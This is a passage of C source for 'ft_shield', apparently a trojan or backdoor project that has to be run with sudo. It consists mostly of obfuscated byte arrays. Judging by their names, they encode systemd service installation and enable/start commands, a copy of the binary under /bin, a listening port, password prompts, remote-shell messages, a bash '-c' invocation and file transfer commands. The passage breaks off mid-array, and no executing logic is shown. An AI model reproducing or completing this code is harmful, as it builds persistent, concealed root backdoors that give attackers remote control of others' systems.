const unsigned char	srccode[]	=	{0x11};

#include <time.h>
#include <poll.h>
#include <stdio.h>
#include <fcntl.h>
#include <ctype.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <limits.h>
#include <libgen.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define LOGINS					"orekabe & aabdou\n"
#define SUDO					"You should run 'ft_shield' with sudo privilege\n"
#define	MAX_CLIENT_CONNECTION	3

const unsigned char	servport[]	=	{0x07, 0x4E, 0x22, 0x27};
const unsigned char	ftscheck[]	=	{0x1D, 0x1A, 0x62, 0x4A, 0xDD, 0xA1, 0x85, 0x85, 0xF4, 0x5A, 0x37, 0x03, 0xD0, 0xDE, 0x75, 0xBE, 0x40, 0xE7, 0x48};
const unsigned char sfc[]		=	{0x68, 0x29, 0x78, 0x7C, 0xDA, 0x94, 0xE6, 0xA4, 0xFD, 0x4D, 0x0B, 0x12, 0xD1, 0xCB, 0x62, 0xBC, 0x5C, 0xFC, 0x18,
									 0x7A, 0x28, 0x0F, 0x48, 0xC5, 0x4C, 0xBA, 0x39, 0x75, 0x50, 0x8A, 0x76, 0x00, 0x5B, 0x8C, 0x52, 0x58, 0x5C, 0x94,
									 0xA8, 0x1B, 0x4B, 0xDF, 0xAB, 0x48, 0xFE, 0x33, 0xF0, 0xFB, 0x08, 0x24, 0xCC, 0x2D, 0x66, 0xC7, 0xD1, 0x07, 0xC0,
									 0xF9, 0xF2, 0x80, 0x2A, 0x5E, 0x00, 0xE8, 0x2D, 0x21, 0x9E, 0x4F, 0xC7, 0x64, 0x3B, 0x0A, 0x20, 0x6A, 0xC1, 0xF9,
									 0x99, 0x49, 0xFD, 0xE3, 0x48, 0xCA, 0xC4, 0xF4, 0x99, 0x58, 0xF2, 0xE7, 0x97, 0x85, 0xEC, 0x43, 0x98, 0xCE, 0x11,
									 0x68, 0xEA, 0x82, 0x77, 0x35, 0x23, 0x43, 0x08, 0x44, 0xD1, 0x15, 0x94, 0x6A, 0xDF, 0xC0, 0x79, 0x9B, 0xFB, 0xB5,
									 0x8C, 0x28, 0x9D, 0xF4, 0x52, 0x70, 0x50, 0xDA, 0x34, 0x1B, 0x7B, 0x5C, 0xE0, 0x5C, 0xD7, 0xAD, 0x09, 0xEF, 0x69,
									 0x8B, 0x4E, 0x97, 0xE0, 0x0D, 0xB7, 0xEA, 0x69, 0x36, 0xC2, 0x57, 0xDC, 0x34, 0xE7, 0xCA, 0x90, 0x89, 0x46, 0x35,
									 0x39, 0x03, 0x6C, 0x20, 0x04, 0xBF, 0x6B, 0xDB, 0x67, 0x03, 0x2C, 0x31, 0x63, 0x05, 0xD9, 0x63, 0x18, 0xA6, 0xC9,
									 0x0D, 0xA2, 0x9A, 0xF7, 0x31, 0xE2, 0x10, 0x21, 0x6C, 0xFD, 0x2F, 0x23, 0x7E, 0x93, 0x50, 0x25, 0x6A, 0x7F, 0x7E,
									 0x8A, 0xFD, 0xD9, 0xA4, 0x4E, 0x2A, 0x05, 0x0A, 0xD6, 0x27, 0x8B, 0xCC, 0x9E, 0x0C, 0xCC, 0x85, 0x02, 0x75, 0x65,
									 0x21, 0xC8, 0xD7, 0xF9, 0xFB, 0xF0, 0x50, 0xF6, 0x25, 0x71, 0xDE, 0x7A, 0x52, 0xE6, 0x03, 0xF3, 0x1E, 0x2D, 0x56,
									 0x1F, 0x68, 0x72, 0xB9, 0x6D, 0x6D, 0x69, 0xE4, 0xFF, 0x0D, 0x89, 0x5D, 0x76, 0xB5, 0x96, 0x31, 0x04, 0x1D, 0xF3,
									 0x00, 0xF5, 0x74, 0x31, 0xD0, 0xC2, 0x4E, 0x7C, 0x97, 0x46, 0x76, 0xCA, 0x2E, 0x89, 0xEB, 0x80};
const unsigned char	commands[]	=	{0x70, 0x13, 0x7B, 0x78, 0xCF, 0xA7, 0x88, 0x93, 0xA2, 0x34, 0x48, 0x40, 0x98, 0xD3, 0x73, 0xB9, 0x43, 0xB2, 0x08,
									 0x3C, 0x63, 0x70, 0x1B, 0x8D, 0x05, 0xFF, 0x75, 0x31, 0x50, 0xDE, 0x24, 0x4F, 0x11, 0xCD, 0x1C, 0x72, 0x76, 0xEF,
									 0xDB, 0x5E, 0x19, 0x89, 0xE2, 0x0B, 0xBB, 0x4E, 0xDA, 0x8E, 0x5B, 0x61, 0x9E, 0x30, 0x34, 0x92, 0x9E, 0x53, 0xEA,
									 0x8B, 0xB7, 0xA0, 0x36, 0x50, 0x05, 0xEF, 0x30, 0x34, 0x9A, 0x51, 0xD5, 0x3D, 0x20, 0x65, 0x1E, 0x7F, 0x92, 0xE0,
									 0x9D, 0x48, 0xFA, 0xD1, 0x4A, 0xCC, 0xF3, 0xE1, 0xCA, 0x72, 0xD2, 0xE7, 0x9B, 0x92, 0x9F, 0x17, 0xD9, 0x9C, 0x45,
									 0x75, 0xE5, 0xD7, 0x24, 0x67, 0x2C, 0x01, 0x41, 0x0A, 0xDE, 0x53, 0xC0, 0x15, 0x8C, 0x88, 0x30, 0xDE, 0xB7, 0xF1,
									 0xA6, 0x5F, 0xD2, 0xA6, 0x19, 0x39, 0x1E, 0x9D, 0x50, 0x52, 0x29, 0x19, 0xB9, 0x08, 0x98, 0xFF, 0x50, 0xF2, 0x05,
									 0xED, 0x72, 0x90, 0xE4, 0x43, 0xB0, 0xFE, 0x69, 0x20, 0xE8, 0x4C, 0xDC, 0x64, 0xF1, 0xD2, 0xC4, 0x8A, 0x41, 0x2D,
									 0x7C, 0x5A, 0x2C, 0x38, 0x0B, 0xA8, 0x27, 0xC3, 0x61, 0x0B, 0x6D, 0x5D, 0x37, 0x7A, 0x8A, 0x78, 0x19, 0xA6, 0xC9,
									 0x05, 0xAC, 0xCA, 0xD1, 0x06, 0xBE, 0x77, 0x75, 0x4C, 0xD7, 0x0F, 0x10, 0x49, 0xA4, 0x46, 0x69, 0x38, 0x2C, 0x5C,
									 0xF8, 0xC9, 0xE4, 0xF6, 0x0B, 0x30, 0x0A, 0x5C, 0x97, 0x75, 0x84, 0x80, 0xD1, 0x4B, 0xC3, 0xC3, 0x56, 0x10, 0x36,
									 0x69, 0x81, 0x92, 0xB5, 0xDC, 0xDD, 0x50, 0xE5, 0x23, 0x7B, 0x8C, 0x35, 0x1E, 0xFB, 0x01, 0x8F, 0x71, 0x04, 0x6C,
									 0x14, 0x3B, 0x75, 0xB0, 0x64, 0x6D, 0x58, 0xCE, 0xCB, 0x03, 0x89, 0x47, 0x76, 0xB2, 0xA0, 0x21, 0x56, 0x1E, 0x8C,
									 0x4C, 0xA1, 0x3D, 0x6F, 0xC0, 0xDF, 0x4F, 0x2E, 0x85, 0x7B, 0x47, 0xEE, 0x7D, 0xCC, 0xDE, 0xCE, 0x4D, 0x78, 0xED,
									 0x41, 0x32, 0xE5, 0x60, 0xB7, 0xEC, 0x73, 0x0F, 0x0E, 0x23, 0x3B, 0xCC, 0xFC, 0x83, 0x22, 0xCB, 0xD3, 0x34, 0xEF,
									 0x4C, 0x9A, 0x13, 0xD9, 0xAD, 0xBD, 0xBE, 0x2C, 0x83, 0x52, 0x66, 0xD8, 0x8D, 0x11, 0xC0, 0x7B, 0xFD, 0xDE, 0x81,
									 0x53, 0xCC, 0xC2, 0x11, 0x59, 0x92, 0xEF, 0x43, 0xE8, 0xDF, 0xB1, 0xD5, 0x70, 0x58, 0x89, 0x54, 0x2D, 0x7F, 0xCE,
									 0x89, 0x1B, 0x14, 0xD5, 0x18, 0x3F, 0x67, 0x33, 0xBF, 0x87, 0x41, 0xE0, 0x90, 0xB8, 0xE5, 0x2D, 0xE1, 0x2B, 0x70,
									 0x15, 0x7A, 0x5F, 0x02, 0x0D, 0x9F, 0x15, 0xDD, 0x94, 0x1D, 0x02, 0x44, 0x5C, 0x4F, 0xFB, 0x37, 0xAD, 0xD6, 0x3A,
									 0x5E, 0x83, 0x72, 0xAE, 0xC3, 0xA6, 0x7C, 0x49, 0xC0, 0x47, 0x89, 0x85, 0xDB, 0x84, 0xC9, 0x55, 0x92, 0x17, 0xDC,
									 0xB1, 0xB3, 0xE3, 0xA2, 0xB6, 0x11, 0x63, 0x8C, 0xFF, 0x0A, 0xB5, 0xC3, 0x4D, 0x91, 0xF0, 0x74, 0xFE, 0x24, 0x11,
									 0x4F, 0x2D, 0xB2, 0x9B, 0xA5, 0xF1, 0x73, 0x74, 0xB3, 0x02, 0x63, 0xE7, 0xDD, 0x9D, 0xDC, 0x41, 0xA8, 0xC9, 0xA5,
									 0x0B, 0x60, 0x1A, 0x1D, 0x3F, 0x67, 0xC8, 0x4C, 0x18, 0xFA, 0x67, 0x00, 0xDC, 0x1B, 0x93, 0x49, 0xE6, 0x34, 0x4F,
									 0x7E, 0x7E, 0x0E, 0xBF, 0x1A, 0x20, 0x52, 0x6C, 0xCD, 0x3F, 0x17, 0x33, 0xA3, 0xCD, 0xED, 0x62, 0x67, 0x7C, 0x63,
									 0xA7, 0x1F, 0x55, 0xA4, 0xAA, 0xD0, 0xCA, 0xC1, 0x3E, 0x0E, 0xDB, 0xA4, 0xBF, 0x59, 0xA9, 0x25, 0x57, 0x74, 0xFA,
									 0x76, 0x53, 0x91, 0x7F, 0xF2, 0x71, 0xF6, 0xD7, 0x04, 0x0C, 0x3A, 0x40, 0x65, 0xF1, 0x37, 0xA8, 0x20, 0x5C, 0xAB,
									 0x78, 0x8A, 0x2A, 0xD9, 0x53, 0xCE, 0x1B, 0xB1, 0xBB, 0xEC, 0xF2, 0x83, 0x33, 0x45, 0x06, 0x6B, 0xEE, 0xBD, 0x9E,
									 0x30, 0x33, 0x89, 0x0D, 0xF5, 0x54, 0x86, 0xBE, 0x8D, 0x5E, 0x0C, 0xCE, 0xA7, 0x1D, 0x60, 0x04, 0x77, 0xF0, 0x90,
									 0x96, 0xD2, 0x12, 0x77, 0xAA, 0x54, 0x87, 0x56, 0x2F, 0xDC, 0x4C, 0x27, 0xDE, 0x44, 0x0A, 0x4B, 0x93, 0x30, 0x84,
									 0x09, 0xF1, 0xC2, 0xCA, 0x9D, 0xF0, 0xC8, 0x76, 0x3B, 0x80, 0x83, 0x12, 0x56, 0xFF, 0x10, 0x1B, 0xDE, 0x7A, 0x8A,
									 0xDB, 0x62, 0x5C, 0xAD, 0x42, 0xED, 0xF4, 0x98, 0x23, 0x36, 0xF7, 0xB2, 0xBC, 0x05, 0x26, 0x5C, 0xD4, 0xF3, 0xE8,
									 0xC1, 0xF1, 0xE9, 0x35, 0x48, 0x73, 0x33, 0x5D, 0xE4, 0x45, 0xAB, 0x11, 0x36, 0x0B, 0x8F, 0xEA, 0x4E, 0xEE, 0x73,
									 0x12, 0xF3, 0x8A, 0xAD, 0xDA, 0xEC, 0xAA, 0x2D, 0x17, 0x15, 0xA6, 0x43, 0xEE, 0x23, 0xFC, 0x95, 0xE4, 0x11, 0xF9,
									 0xD9, 0x1F, 0x38, 0xAF, 0x5D, 0x85, 0x18, 0xFF, 0x28, 0x9D, 0xA7, 0xB7, 0x9D, 0x8B, 0xCE, 0x09, 0xDD, 0x33, 0x96,
									 0x7D, 0x51, 0x33, 0x7C, 0x65, 0x19, 0xEE, 0x5F, 0x2D, 0x3E, 0xD5, 0x44, 0x22, 0xBB, 0x86, 0x65, 0x6A, 0x43, 0xDB,
									 0x8A, 0x2B, 0x33, 0x81, 0x17, 0x22, 0xBF, 0xD0, 0x4F, 0x49, 0x56, 0xFF, 0x7A, 0x60, 0x25, 0x3B, 0x86, 0xF8, 0x82,
									 0xA5, 0x59, 0x3B, 0xB8, 0x29, 0xF4, 0x5F, 0x5D, 0x7C, 0x39, 0x9E, 0x5A, 0x74, 0x97, 0xFF, 0x85, 0xC8, 0x6E, 0x03,
									 0x74, 0xAD, 0x7A, 0x12, 0x34, 0x3D, 0x2C, 0xAC, 0x5B, 0x9C, 0x37, 0x95, 0x5B, 0x78, 0xAC, 0xDF, 0xD2, 0xC7, 0x5A,
									 0xEC, 0xF1, 0xB7, 0x5D, 0xE7, 0xB5, 0x21, 0xB0, 0xB7, 0x30, 0xCB, 0x3E, 0xE4, 0x57, 0x9B, 0xDB, 0x43, 0x97, 0x12,
									 0x47, 0x01, 0x1F, 0xCC, 0xD7, 0x53, 0xBB, 0xA8, 0x11, 0xED, 0x59, 0x1E, 0x54, 0xB5, 0xEE, 0x0C, 0x53, 0xC5, 0x6A,
									 0x78, 0x66, 0x43, 0xC8, 0xA6, 0x9A, 0x06, 0x8C, 0xE6, 0x5D, 0x5E, 0x6C, 0x5A, 0xF3, 0xA8, 0x83, 0x1A, 0xB4, 0x17,
									 0x69, 0x43, 0x9E, 0xE4, 0x69, 0x30, 0xB4, 0x4F, 0xA4, 0xEA, 0x11, 0x8F, 0x8B, 0x6F, 0xE3, 0x36, 0x42, 0x3F, 0xAE,
									 0x26, 0xA4, 0xAC, 0x29, 0xAC, 0xE1, 0xB7, 0x3B, 0x59, 0x8C, 0xEB, 0xA7, 0xB2, 0x19, 0x02, 0x70, 0xF4, 0xEB, 0x40,
									 0xCA, 0x0B, 0x95, 0xB9, 0x59, 0x9B, 0xEC, 0x3F, 0x70, 0x6A, 0x38, 0x61, 0xBE, 0x97, 0x86, 0xE8, 0xEB, 0xAA, 0x50,
									 0x51, 0x8E, 0x89, 0x3E, 0xC9, 0x18, 0x97, 0xF2, 0x95, 0xEB, 0x44, 0x8D, 0x1C, 0x1D, 0x06, 0x3C, 0x2B, 0xC6, 0xA3,
									 0xC0, 0xBD, 0x8E, 0x69, 0x01, 0xA8, 0xBB, 0xC4, 0x56, 0xCE, 0x51, 0xE6, 0x11, 0xA6, 0x66, 0x19, 0xFC, 0x76, 0x5B,
									 0x12, 0x48, 0xB0, 0xC5, 0xF3, 0x8D, 0x0D, 0xAE, 0x11, 0x7E, 0x24, 0xC7, 0xBA, 0x77, 0x02, 0x70, 0xEC, 0x88, 0x34,
									 0x63, 0x11, 0x66, 0x6C, 0xF1, 0x71, 0x57, 0xB0, 0x70, 0x13, 0xEC, 0x50, 0x0D, 0xAA, 0x31, 0x04, 0x5F, 0x7B, 0x4C,
									 0xD0, 0x96, 0x2A, 0xC7, 0x95, 0x4E, 0xFE, 0xFA, 0x1A, 0x38, 0xFC, 0x95, 0xB6, 0x21, 0xF0, 0x1C, 0x7D, 0xD6, 0x79,
									 0x4E, 0xF6, 0x88, 0x19, 0x32, 0x6C, 0x17, 0x6B, 0xDE, 0xA2, 0x7D, 0x85, 0x4B, 0x2E, 0x73, 0x8F, 0x1D, 0x0B, 0xE3,
									 0xB3, 0x1D, 0x1D, 0x4E, 0x00, 0x02, 0xF5, 0xA9, 0x13, 0x4A, 0x9B, 0x4D, 0xB0, 0x61, 0x34, 0xF5, 0xE4, 0x92, 0x00,
									 0xC6, 0x5B, 0x4B, 0x51, 0x16, 0xA8, 0x3D, 0xE4, 0x1F, 0xD1, 0x27, 0x3D, 0xD2, 0x98, 0xEE, 0x21, 0xE9, 0x9E, 0x8E,
									 0x0E, 0x69, 0x1F, 0xC5, 0xB3, 0xCE, 0xC8, 0xA8, 0x22, 0xB8, 0xC7, 0x06, 0x20, 0x49, 0xE6, 0x76, 0x9D, 0xEE, 0x63,
									 0x87, 0xFD, 0x6B, 0x2F, 0x31, 0xD3, 0x5F, 0x86, 0xD7, 0xC9, 0xEE, 0xE6, 0xF5, 0x88, 0x62, 0xEF, 0xF9, 0x3F, 0x34,
									 0x64, 0xA7, 0x16, 0xEC, 0x19, 0xFF, 0x51, 0xA4, 0x33, 0xCB, 0x03, 0x6A, 0xBB, 0x8C, 0xA9, 0xAF, 0xD9, 0x69, 0x18,
									 0x47, 0x41, 0x7B, 0xCC, 0xCE, 0xB3, 0x45, 0xB9, 0x9E, 0x3B, 0x69, 0xB4, 0x56, 0xED, 0xAA, 0x3D, 0x4F, 0xDD, 0x72,
									 0x6A, 0x60, 0x4B, 0x91, 0xD7, 0x99, 0xB3, 0x6E, 0x64, 0x31, 0xF8, 0x7B, 0xD6, 0x50, 0x81, 0x42, 0x87, 0x68, 0xCD,
									 0xC6};
const unsigned char cnf[]		=	{0x55, 0x08, 0x49, 0x66, 0xC6, 0xA0, 0x89, 0x8C, 0xFC, 0x1E, 0x4C, 0x5E, 0x98, 0xF8, 0x79, 0xB8, 0x5E, 0xF3, 0x4B,
									 0x78, 0x7C, 0x3E, 0x54, 0xD9, 0x05, 0xB9, 0x3A, 0x64, 0x1E, 0x9A, 0x2A, 0x4F, 0x44, 0x9E, 0x59, 0x72, 0x71, 0xA7,
									 0x9E, 0x12, 0x49, 0x8E, 0xE2, 0x5F, 0xF4, 0x4E, 0x9D, 0xCB, 0x0F, 0x61, 0xCA, 0x78, 0x71, 0x88, 0xD6, 0x16, 0xA6,
									 0xDB, 0xB7, 0x9E, 0x3B, 0x51, 0x07, 0x96};
const unsigned char progpath[]	=	{0x1C, 0x0C, 0x64, 0x7A, 0xCD, 0xE6, 0x9F, 0x85, 0xF4, 0x58, 0x47, 0x05, 0xC0, 0xDE};
const unsigned char binpath[]	=	{0x1C, 0x09, 0x65, 0x67, 0x81, 0xAB, 0x85, 0x8E};
const unsigned char rootpath[]	=	{0x1C};
const unsigned char nullpath[]	=	{0x1C, 0x18, 0x73, 0x63, 0x81, 0xA7, 0x99, 0x8C, 0xF4};
const unsigned char targpath[]	=	{0x1C, 0x09, 0x65, 0x67, 0x81, 0xAB, 0x85, 0x8E, 0xB7, 0x58, 0x1C, 0x3F, 0xCB, 0xD3, 0x7F, 0xB0, 0x5F, 0xF6};
const unsigned char sfcpath[]	=	{0x1C, 0x19, 0x62, 0x76, 0x81, 0xBA, 0x95, 0x93, 0xEC, 0x5B, 0x05, 0x04, 0x97, 0xC8, 0x6F, 0xA6, 0x47, 0xF7, 0x48,
									 0x33, 0x3A, 0x24, 0x64, 0xDE, 0x4D, 0xB6, 0x30, 0x7D, 0x14, 0xD0, 0x77, 0x0A, 0x43, 0x9B, 0x55, 0x31, 0x33};
const unsigned char reload[]	=	{0x40, 0x05, 0x65, 0x61, 0xCB, 0xA4, 0x8F, 0x94, 0xF4, 0x1E, 0x0C, 0x01, 0xDD, 0xD6, 0x79, 0xBB, 0x1E, 0xE0, 0x40,
									 0x70, 0x33, 0x31, 0x5F};
const unsigned char enable[]	=	{0x40, 0x05, 0x65, 0x61, 0xCB, 0xA4, 0x8F, 0x94, 0xF4, 0x1E, 0x0D, 0x0E, 0xD9, 0xD9, 0x7A, 0xB0, 0x13, 0xF4, 0x51,
									 0x43, 0x2F, 0x38, 0x52, 0xC8, 0x49, 0xBB};
const unsigned char start[]		=	{0x40, 0x05, 0x65, 0x61, 0xCB, 0xA4, 0x8F, 0x94, 0xF4, 0x1E, 0x1B, 0x14, 0xD9, 0xC9, 0x62, 0xF5, 0x55, 0xE6, 0x7A,
									 0x6F, 0x34, 0x39, 0x5E, 0xC1, 0x41};
const unsigned char rscreate[]	=	{0x70, 0x0E, 0x73, 0x74, 0xDA, 0xA0, 0x82, 0x87, 0xB8, 0x5F, 0x48, 0x12, 0xDD, 0xCD, 0x73, 0xA7, 0x40, 0xF7, 0x05,
									 0x6F, 0x34, 0x35, 0x57, 0xC1, 0x05, 0xBC, 0x3A, 0x7F, 0x1E, 0x9B, 0x67, 0x1B, 0x58, 0x82, 0x52, 0x72, 0x78, 0xE1,
									 0xD5, 0x74};
const unsigned char rsfailed[]	=	{0x75, 0x1D, 0x7F, 0x79, 0xCB, 0xAD, 0xCC, 0x94, 0xF7, 0x1E, 0x0B, 0x12, 0xDD, 0xDA, 0x62, 0xB0, 0x13, 0xE0, 0x40,
									 0x6A, 0x39, 0x22, 0x48, 0xC8, 0x05, 0xAC, 0x3D, 0x74, 0x1C, 0x92, 0x24, 0x0C, 0x5E, 0x83, 0x52, 0x37, 0x35, 0xBB,
									 0x92, 0x11, 0x57, 0x87, 0xC8};
const unsigned char rsargerr[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0xA9, 0xF6, 0x48, 0x09, 0x0C, 0xD1, 0xDF, 0x36, 0x94, 0x41, 0xF5, 0x50,
									 0x71, 0x39, 0x3E, 0x4F, 0xDE, 0x2F, 0x8A, 0x26, 0x70, 0x17, 0x9B, 0x3E, 0x4F, 0x42, 0x85, 0x59, 0x3E, 0x3A, 0xEF,
									 0xC7, 0x37, 0x69, 0xFF, 0xF6, 0x0B, 0xDA, 0x2A, 0xBE, 0xFC, 0x3E, 0x12, 0xED, 0x2E, 0x34, 0x94, 0xEE, 0x3C, 0x98,
									 0xFF, 0xA9, 0xF9};
const unsigned char rsiperr[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0xA9, 0xF6, 0x48, 0x09, 0x0C, 0xD1, 0xDF, 0x36, 0x9C, 0x63, 0xC4, 0x11,
									 0x3C, 0x3D, 0x34, 0x5F, 0xDF, 0x40, 0xAC, 0x26, 0x1B};
const unsigned char rsporterr[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0xA9, 0xF6, 0x48, 0x09, 0x0C, 0xD1, 0xDF, 0x36, 0x85, 0x7C, 0xC0, 0x71,
									 0x16};
const unsigned char rssuccess[]	=	{0x61, 0x19, 0x60, 0x70, 0xDC, 0xBA, 0x89, 0xC0, 0xEB, 0x56, 0x0D, 0x0C, 0xD4, 0x9B, 0x75, 0xA7, 0x56, 0xF3, 0x51,
									 0x79, 0x38, 0x70, 0x48, 0xD8, 0x46, 0xBC, 0x30, 0x62, 0x03, 0x98, 0x71, 0x03, 0x5D, 0x94, 0x1D, 0x58};
const unsigned char bash[]		=	{0x1C, 0x1E, 0x7F, 0x7B, 0x81, 0xAB, 0x8D, 0x93, 0xF0};
const unsigned char	basharg[]	=	{0x1E, 0x15};
const unsigned char	bashargc[]	=	{0x1E, 0x1F};
const unsigned char help[]		=	{0x5B, 0x19, 0x7A, 0x65};
const unsigned char qmark[]		=	{0x0C};
const unsigned char out[]		=	{0x56, 0x04, 0x7F, 0x61};
const unsigned char shell[]		=	{0x40, 0x14, 0x73, 0x79, 0xC2};
const unsigned char post[]		=	{0x40, 0x19, 0x78, 0x71};
const unsigned char receive[]	=	{0x41, 0x19, 0x75, 0x70, 0xC7, 0xBF, 0x89};
const unsigned char prompt[]	=	{0x55, 0x08, 0x49, 0x66, 0xC6, 0xA0, 0x89, 0x8C, 0xFC, 0x1E, 0x4C, 0x5E, 0x98};
const unsigned char passerr[]	=	{0x64, 0x0E, 0x79, 0x7B, 0xC9, 0xE9, 0xBC, 0x81, 0xEB, 0x4D, 0x1F, 0x0F, 0xCA, 0xDF, 0x38, 0xF5, 0x67, 0xE0, 0x5C,
									 0x3C, 0x3D, 0x37, 0x5A, 0xC4, 0x4B, 0xE5, 0x75};
const unsigned char maxtry[]	=	{0x67, 0x13, 0x79, 0x35, 0xC3, 0xA8, 0x82, 0x99, 0xB8, 0x58, 0x09, 0x09, 0xD4, 0xDE, 0x72, 0xF5, 0x52, 0xE6, 0x51,
									 0x79, 0x31, 0x20, 0x4F, 0xDE, 0x0B, 0xFF, 0x11, 0x78, 0x03, 0x9D, 0x6B, 0x01, 0x5F, 0x88, 0x5F, 0x26, 0x3F, 0xA1,
									 0x9C, 0x50, 0x17, 0x87, 0xC8};
const unsigned char cnfailed[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0xA6, 0xF9, 0x57, 0x04, 0x05, 0xDC, 0x9B, 0x62, 0xBA, 0x13, 0xF1, 0x4A,
									 0x72, 0x32, 0x35, 0x58, 0xD9, 0x05, 0xAB, 0x3A, 0x31, 0x02, 0x9B, 0x69, 0x00, 0x45, 0x88, 0x1C, 0x26, 0x24, 0xA0,
									 0x91, 0x1F, 0x57, 0x88, 0xC8};
const unsigned char enterpass[]	=	{0x63, 0x10, 0x73, 0x74, 0xDD, 0xAC, 0xCC, 0x85, 0xF6, 0x4A, 0x0D, 0x12, 0x98, 0xC2, 0x79, 0xA0, 0x41, 0xB2, 0x55,
									 0x7D, 0x2F, 0x23, 0x4C, 0xC2, 0x57, 0xBB, 0x6F, 0x31};
const unsigned char runcmd[]	=	{0x54, 0x1F, 0x75, 0x35, 0x83, 0x9E, 0x8D, 0x8C, 0xF4, 0x1E, 0x45, 0x37, 0xDD, 0xC3, 0x62, 0xA7, 0x52, 0xB2, 0x08,
									 0x4B, 0x39, 0x22, 0x49, 0xC2, 0x57, 0xFF, 0x70, 0x62, 0x50, 0xD3, 0x6B, 0x4F, 0x14, 0x9E};
const unsigned char readmode[]	=	{0x41, 0x1E};
const unsigned char writemode[]	=	{0x44, 0x1E};
const unsigned char frline[]	=	{0x50, 0x13, 0x78, 0x66, 0xDA, 0xE9, 0x99, 0x8E, 0xEB, 0x57, 0x0F, 0x0E, 0xDD, 0xDF, 0x36, 0xB6, 0x5B, 0xF3, 0x57,
									 0x15, 0x2F, 0x22, 0x58, 0xCE, 0x4A, 0xBB, 0x30, 0x4A, 0x2D, 0xF7, 0x39, 0x66, 0x4A, 0xE7};
const unsigned char lsline[]	=	{0x39, 0x01, 0x2D, 0x1F, 0xA4};
const unsigned char vnewline[]	=	{0x1F, 0x76};
const unsigned char vspace[]	=	{0x1F, 0x5C};
const unsigned char hexspec[]	=	{0x03, 0x04, 0x33, 0x25, 0x9C, 0x91};
const unsigned char srcspec[]	=	{0x16, 0x0F};
const unsigned char dspec[]		=	{0x25, 0x64};
const unsigned char filespec[]	=	{0x1C, 0x08, 0x7B, 0x65, 0x81, 0xEC, 0x80, 0x84, 0xC7, 0x1B, 0x04, 0x0C, 0xDC, 0xE4, 0x33, 0xB9, 0x5F, 0xE7, 0x0B,
									 0x7F};
const unsigned char rsspec[]	=	{0x16, 0x0F, 0x36, 0x30, 0x9F, 0xFC, 0x9F, 0xC0, 0xBD, 0x0B, 0x1B};
const unsigned char snspec[]	=	{0x16, 0x0F, 0x36, 0x30, 0x9F, 0xFC, 0x9F, 0xC0, 0xBD, 0x0B, 0x1B, 0x40, 0x9D, 0xC8};
const unsigned char snerrspec[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0xA9, 0xF6, 0x48, 0x09, 0x0C, 0xD1, 0xDF, 0x36, 0x94, 0x41, 0xF5, 0x50,
									 0x71, 0x39, 0x3E, 0x4F, 0xDE, 0x2F, 0x8A, 0x26, 0x70, 0x17, 0x9B, 0x3E, 0x4F, 0x42, 0x88, 0x52, 0x36, 0x76, 0xF3,
									 0xB2, 0x2E, 0x6F, 0x9D, 0xE2, 0x6A, 0xDF, 0x2A, 0xA8, 0xEB, 0x28, 0x12, 0x80, 0x30, 0x28, 0xF8, 0xF1, 0x21, 0x9E,
									 0x95, 0xB7, 0xCF, 0x18, 0x76, 0x3E, 0xD9, 0x30, 0x10, 0xB3, 0x6C, 0xEE, 0x23, 0x42};
const unsigned char snflerr[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0x86, 0xF1, 0x52, 0x0D, 0x40, 0xE3, 0x9E, 0x65, 0x88, 0x13, 0xFC, 0x4A,
									 0x68, 0x7C, 0x36, 0x54, 0xD8, 0x4B, 0xBB, 0x5F};
const unsigned char snflfail[]	=	{0x75, 0x1D, 0x7F, 0x79, 0xCB, 0xAD, 0xCC, 0x94, 0xF7, 0x1E, 0x1B, 0x05, 0xD6, 0xDF, 0x36, 0xB3, 0x5A, 0xFE, 0x40,
									 0x16};
const unsigned char snflcmd[]	=	{0x5D, 0x1F, 0x36, 0x38, 0xDF, 0xE9, 0xDC, 0xC0, 0xBD, 0x4D, 0x48, 0x45, 0xCB, 0x9B, 0x2A, 0xF5, 0x16, 0xE1};
const unsigned char rcspec[]	=	{0x16, 0x0F, 0x36, 0x30, 0xDD};
const unsigned char rcerrspec[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0xA9, 0xF6, 0x48, 0x09, 0x0C, 0xD1, 0xDF, 0x36, 0x94, 0x41, 0xF5, 0x50,
									 0x71, 0x39, 0x3E, 0x4F, 0xDE, 0x2F, 0x8A, 0x26, 0x70, 0x17, 0x9B, 0x3E, 0x4F, 0x43, 0x88, 0x5F, 0x37, 0x3F, 0xB9,
									 0x9E, 0x5E, 0x05, 0xEF, 0x8B, 0x67, 0xDE, 0x4E, 0xAA, 0xEF, 0x2F, 0x09, 0x80, 0x1A};
const unsigned char	rcfail[]	=	{0x75, 0x1D, 0x7F, 0x79, 0xCB, 0xAD, 0xCC, 0x94, 0xF7, 0x1E, 0x0B, 0x12, 0xDD, 0xDA, 0x62, 0xB0, 0x13, 0xF4, 0x4C,
									 0x70, 0x39, 0x70, 0x49, 0xC8, 0x46, 0xBA, 0x3C, 0x67, 0x15, 0x8C, 0x0E};
const unsigned char	rccmd[]		=	{0x5D, 0x1F, 0x36, 0x38, 0xC2, 0xB9, 0xCC, 0xC5, 0xEB, 0x1E, 0x56, 0x40, 0x9D, 0xC8};
const unsigned char	rcsuccess[]	=	{0x61, 0x19, 0x77, 0x71, 0xD7, 0xE9, 0x98, 0x8F, 0xB8, 0x4C, 0x0D, 0x03, 0xDD, 0xD2, 0x60, 0xB0, 0x13, 0xF4, 0x4C,
									 0x70, 0x39, 0x70, 0x54, 0xC3, 0x05, 0xAF, 0x3A, 0x63, 0x04, 0xDE, 0x21, 0x0B, 0x3B};
const unsigned char	rmftscmd[]	=	{0x61, 0x19, 0x77, 0x71, 0xD7, 0xE9, 0x98, 0x8F, 0xB8, 0x4C, 0x0D, 0x03, 0xDD, 0xD2, 0x60, 0xB0, 0x13, 0xF4, 0x4C,
